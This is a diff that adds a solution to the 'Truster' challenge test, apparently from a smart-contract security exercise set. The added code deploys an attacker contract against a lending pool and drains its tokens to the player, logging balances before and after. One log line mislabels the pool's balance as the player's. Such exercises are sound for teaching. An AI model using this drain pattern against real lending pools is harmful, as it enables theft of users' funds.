@@ -23,6 +23,12 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("Pool balance before: ", await token.balanceOf(pool.address));
+        console.log("Player balance before: ", await token.balanceOf(pool.address));
+        poolAttacker = await (await ethers.getContractFactory('TrusterLenderPoolAttack', deployer)).deploy(pool.address);
+        await poolAttacker.connect(player).launchAttack(TOKENS_IN_POOL);
+        console.log("Pool balance after: ", await token.balanceOf(pool.address));
+        console.log("Player balance after: ", await token.balanceOf(player.address));
     });
 
     after(async function () {
